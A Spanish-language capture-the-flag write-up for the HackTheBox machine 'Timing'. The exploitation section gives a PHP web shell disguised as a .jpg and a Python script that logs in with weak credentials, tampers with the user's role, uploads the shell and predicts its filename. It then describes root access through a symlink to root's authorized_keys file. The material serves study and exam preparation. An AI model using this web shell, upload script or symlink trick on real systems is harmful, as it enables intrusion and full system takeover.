## Descripción

**Timing** es una máquina de dificultad media ideal para practicar la interpretación de código, siendo asi una buena preparación para la **eWPT**. Su resolución se basa en la explotación de malas configuraciones en la sanitización de entradas, el uso de credenciales débiles, una gestión incorrecta de roles y la subida insegura de archivos. La máquina demuestra cómo estas malas prácticas pueden conducir a la ejecución remota de comandos, migración de usuario y finalmente al compromiso total del sistema.

## Explotación

Una vez cambiado el rol, al acceder a **upload.php** se mostró el mensaje `This extension is not allowed`, lo que indica que ya es posible subir un archivo, en este caso solo acepta **.jpg**

Para la generacion del nombre unico del archivo la web usa uniqid() y un hash construido con md5(). El fragmento relevante del codigo es el siguiente:

```php
$file_hash = uniqid () ;
$file_name = md5 ( ’ $file_hash ’ . time () ) . ’_ ’ . basename ( $_FILES [ " fileToUpload " ][ " name " ]) ; 
```

Sin embargo, en este código, debido al uso incorrecto de comillas simples, no se utiliza el valor de la variable `$file_hash`, sino que se interpreta como una cadena de texto.

Lo único que se tendría que conocer es el valor de la función `time()` en el momento de subir el archivo.

Una vez sabiendo como se nombran los archivos subidos vamos a crear el payload que queremos subir: **megapwned.jpg** 

```php
<?php 
  echo "<pre>" . system($_GET['cmd']) . "<\pre>";
?> 
```

Conociendo ya la secuencia de acciones necesarias, se desarrolló un script en Python encargado de automatizar todo el proceso.

```python
#!/usr/bin/python3

from pwn import *
import requests, signal, sys, time
from email.utils import parsedate_to_datetime

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)

# Variables globales
login_url = "http://10.129.228.4/login.php?login=true"
upload_url = "http://10.129.228.4/upload.php"
update_profile_url = "http://10.129.228.4/profile_update.php"

def makeRequest():

    s = requests.session()

    data_post = {
        'user': 'aaron',
        'password': 'aaron'
    }

    r = s.post(login_url, data=data_post)

    post_data = {
    'firstName': 'aaron',
    'lastName': 'aaron',
    'email': 'aaron@test.htb',
    'company': 'test',
    'role': '1'
    }
    
    r = s.post(update_profile_url, data=post_data)

    with open("megapwned.jpg", "w") as f:
        f.write("<?php system($_GET['cmd']); ?>")

    with open("megapwned.jpg", "rb") as img:
        UploaderFile = {'fileToUpload': ('megapwned.jpg', img)}

        r = s.post(upload_url, files=UploaderFile)
        

        server_date = r.headers.get("Date") 
        dt = parsedate_to_datetime(server_date)
        timestamp_original = int(dt.timestamp())

        md5_hash = hashlib.md5((f"$file_hash{timestamp_original}").encode()).hexdigest()
        name_file = f"{md5_hash}_megapwned.jpg"

        print(f"{name_file}")

if __name__ == '__main__':
    makeRequest()
```

## Escalada de privilegios

Se obtuvo acceso al servidor a través del servicio SSH, autenticándose como el usuario aaron mediante la contraseña identificada en el archivo de respaldo.

![](/assets/images/HackTheBox/Timing/ssh_login.png)

Se identificó que el usuario aaron disponı́a de un privilegio a nivel de sudoers, el cual le permite ejecutar el binario **/usr/bin/netutils** con permisos de **root**

![](/assets/images/HackTheBox/Timing/sudo.png)

El binario netutils permite descargar y almacenar archivos desde una URL. El archivo resultante es creado con privilegios de root.

![](/assets/images/HackTheBox/Timing/netutils_download.png)

![](/assets/images/HackTheBox/Timing/system_list.png)

El objetivo consiste en transferir la clave pública **id_rsa.pub** de la máquina atacante hacia el archivo authorized keys de root.

Primero se creó un enlace simbólico desde **/home/aaron/id_rsa.pub** hacia **/root/.ssh/authorized_keys**

![](/assets/images/HackTheBox/Timing/link_s.png)

Una vez creado el enlace simbólico en la máquina vı́ctima, nos traemos nuestro **id_rsa.pub** al directorio actual de trabajo y activamos un servicio HTTP con python.

![](/assets/images/HackTheBox/Timing/python_http.png)

Se inició el proceso de descarga y transferencia de la clave pública, con el propósito de incorporarla en el archivo authorized keys del usuario root. Una vez completada esta acción, será posible establecer una sesión SSH como root sin necesidad de proporcionar una contraseña.

![](/assets/images/HackTheBox/Timing/escalation_file.png)

![](/assets/images/HackTheBox/Timing/root.png)
